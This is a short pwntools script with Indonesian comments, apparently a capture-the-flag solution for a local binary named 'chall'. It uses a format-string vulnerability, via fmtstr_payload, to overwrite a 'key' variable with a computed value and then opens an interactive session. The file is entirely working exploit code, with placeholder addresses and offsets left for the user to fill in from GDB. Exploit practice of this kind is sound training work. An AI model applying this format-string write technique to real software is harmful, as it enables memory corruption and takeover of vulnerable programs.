from pwn import *

# Ganti dengan path binary Anda
elf = context.binary = ELF('./chall')

# --- LANGKAH 1: Siapkan semua nilai yang dibutuhkan ---
v6_full = (1804289383 << 32) | 0xDEADBEEF
log.info(f"Nilai v6 yang harus ditulis: {hex(v6_full)}")

# --- LANGKAH 2: Dapatkan informasi dari GDB ---
# Ganti dengan alamat 'key' dari GDB (gunakan 'info variables key')
addr_key = 0x4040b0 # Ganti dengan alamat yang benar
offset_fmt_str = 6 # Ganti dengan offset yang benar
# -----------------------------------------------------------

# Mulai proses
p = process()
payload = fmtstr_payload(offset_fmt_str, {addr_key: v6_full})
p.sendline(payload)
p.interactive()